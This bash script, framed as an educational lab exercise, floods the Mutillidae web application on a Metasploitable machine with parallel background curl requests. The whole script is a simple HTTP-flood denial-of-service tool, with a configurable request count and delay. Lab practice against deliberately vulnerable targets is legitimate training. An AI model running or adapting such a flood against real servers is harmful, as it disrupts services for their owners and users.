#!/bin/bash

# ============================================================================
# Educational Simulation: DoS Attack against Metasploitable (HTTP Flood)
# ============================================================================
# WARNING: Use only in a controlled local network for educational purposes!
# Unauthorized access or disruption of systems is illegal.
# ============================================================================

# Set the target URL: specifically the Mutillidae web application on Metasploitable
TARGET="http://192.168.../mutillidae/"

# Read the number of requests from the command line argument (default: 100)
# If the first argument is not provided, it defaults to 100
REQUESTS=${1:-100}

# Read the delay (in seconds) between each request from the command line (default: 0.05)
# If the second argument is not provided, it defaults to 0.05 seconds
DELAY=${2:-0.05}

# Print initial simulation details to the console
echo "===== EDUCATIONAL DoS SIMULATION ====="
echo "Target      : $TARGET"
echo "Requests    : $REQUESTS"
echo "Interval    : $DELAY seconds"
echo "Starting simulation..."

# Start a loop to execute the specified number of requests
for i in $(seq 1 $REQUESTS); do
    # Execute an HTTP GET request to the target using curl
    # -s (silent): Suppresses progress meter and error messages
    # Output is redirected to /dev/null to keep the terminal clean
    # The command ends with '&' to run the process in the background, 
    # allowing for parallel request execution (flood simulation)
    curl -s "$TARGET" > /dev/null &

    # Print the current request count, overwriting the current line (\r)
    echo -ne "[$i/$REQUESTS] request sent...\r"

    # Pause for the specified duration before the next iteration
    sleep $DELAY
done

# Print completion message after the loop finishes
echo -e "\nDoS simulation completed."
